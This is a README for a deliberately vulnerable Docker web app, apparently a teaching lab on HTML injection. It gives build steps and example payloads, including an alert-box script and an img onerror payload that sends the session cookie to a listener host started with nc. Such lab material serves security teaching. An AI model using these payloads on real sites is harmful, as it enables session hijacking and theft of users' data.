# HTML Injection   

A simple docker container that has a web app that is susceptible to HTML injection.

## Build
```
docker build -t html-injection .
```

## Usage
```
docker run -d -p 5000:5000 --name html-injection -t html-injection
```

## Example
Click the "Enter your name button and insert a XSS test alert script.

```
<script>alert("XSS Test")</script>
```

or you can use it to import pictures using a script.

```
<style> body {background-image: url('https://uwe-cyber.github.io/images/uwecyber.png');}</style>
```
or export the session cookie to a remote server.

Have a nc listener running on port 5001 on your local machine.

```
nc -lvp 5001
```

Then use the following script to export the cookie to your local machine. Note the `removeAttribute` is used to prevent the script from running more than once.

```
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
```
